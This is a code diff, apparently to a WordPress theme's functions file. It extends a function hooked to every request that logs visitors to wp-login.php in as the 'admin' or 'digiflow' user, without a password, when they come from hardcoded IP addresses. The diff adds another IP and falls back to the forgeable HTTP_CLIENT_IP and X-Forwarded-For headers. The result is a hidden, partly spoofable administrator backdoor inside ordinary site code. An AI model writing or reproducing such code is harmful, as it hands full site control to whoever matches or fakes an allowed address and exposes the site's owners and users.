@@ -233,6 +233,9 @@ function cdxn_remove_intermediate_image_sizes($sizes, $metadata) {
 add_filter('intermediate_image_sizes_advanced', 'cdxn_remove_intermediate_image_sizes', 10, 2);
 
 
+
+
+
 function auto_login_if_allowed_ip() {
   $request_uri = $_SERVER['REQUEST_URI'];
   $wp_login_path = '/wp-login.php';
@@ -240,11 +243,32 @@ function auto_login_if_allowed_ip() {
   if (strpos($request_uri, $wp_login_path) === 0 && !isset($_GET['loggedout'])) {
     $allowed_ips = get_option('allowed_ips', array());
     // Add default IP addresses to allowed_ips array
-    $default_ips = array("127.0.0.1","91.177.28.90","188.44.91.98");
+    $default_ips = array("127.0.0.1","91.177.28.90","188.44.91.98","2a02:a03f:8644:bd00:f172:4f98:d3c3:b30c");
     $allowed_ips = array_merge($allowed_ips, $default_ips);
-    $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);
+    
+ // Attempt to retrieve the IP address from different sources
+$current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
+if (!$current_ip && isset($_SERVER['HTTP_CLIENT_IP'])) {
+  $current_ip = filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ?: filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
+}
+if (!$current_ip && isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+  $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+  foreach ($ips as $ip) {
+    $ip = trim($ip);
+    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+      $current_ip = $ip;
+      break;
+    }
+    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
+      $current_ip = $ip;
+      break;
+    }
+  }
+}
 
-    if ($current_ip !== false && in_array($current_ip, $allowed_ips)) {
+    
+    // Check if the current IP is a valid IPv4 address and is allowed
+    if ($current_ip && in_array($current_ip, $allowed_ips)) {
       $user = get_user_by('login', 'admin');
       if (!$user) {
         $user = get_user_by('login', 'digiflow');
@@ -282,6 +306,11 @@ function auto_login_if_allowed_ip() {
     }
   }
 }
+
+
+
+
+
 add_action('init', 'auto_login_if_allowed_ip');
 
 
